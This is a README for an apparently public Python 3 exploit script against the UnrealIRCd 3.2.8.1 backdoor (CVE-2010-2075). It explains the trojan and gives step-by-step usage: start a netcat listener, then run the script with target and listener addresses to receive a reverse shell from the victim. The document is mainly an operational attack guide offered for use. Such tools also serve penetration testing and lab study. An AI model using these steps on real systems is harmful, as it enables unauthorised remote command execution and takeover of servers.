# UnrealIRCD-3.2.8.1-Backdoor
UnrealIRCd 3.2.8.1 backdoor command execution exploit in Python 3 (CVE-2010-2075).

# Description
[UnrealIRCd](https://www.unrealircd.org/) version 3.2.8.1 contains a trojan horse which allows remote attackers to execute arbitrary commands ([CVE-2010-2075](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075)).

# Usage
Start a Netcat listener on the listening host:
<sup>nc -lp 4444</sup>

Execute the script, providing the following positional arguments:
<sup>python3 script.py <target> <tport> <listener> <lport></sup>
- `<target>` Target host IP address.
- `<tport>` Target host port number.
- `<listener>` Listening host IP address.
- `<lport>` Listening host port number.

# Example
Set up a netcat listener on your local machine:
<sup>nc -nlvp 4444</sup>
Run the script against a target machine at 192.168.1.3 TCP port 6697:
<sup>python3 script.py 192.168.1.3 6697 192.168.1.2 4444</sup>
Wait a minute and the Netcat listener should receive a reverse shell.
